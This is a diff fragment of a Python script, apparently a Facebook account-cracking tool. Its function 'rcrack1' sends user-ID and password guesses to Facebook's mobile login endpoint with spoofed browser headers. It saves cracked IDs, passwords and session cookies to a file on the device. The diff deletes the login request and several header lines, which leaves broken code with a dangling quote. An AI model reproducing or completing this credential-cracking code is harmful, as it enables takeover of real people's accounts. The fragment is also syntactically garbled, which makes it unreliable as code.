@@ -188,11 +188,7 @@ def rcrack1(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'p.facebook.com',
            'method': 'GET', 
-       	'scheme': 'https', 
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-           'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-          'cache-control': 'max-age=0',
-          'dpr': '1.381250023841858',
+       	'
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
@@ -207,8 +203,7 @@ def rcrack1(uid,pwx,tl):
           'upgrade-insecure-requests': '1',
           'user-agent': pro,
           'viewport-width': '980',}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+           
                 cid = coki[65:80]
                 print(f"\033[38;5;46m[PROTIK MONDAL -OK] {uid}|{ps}")
                 open('/sdcard/PROTIK MONDAL -OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
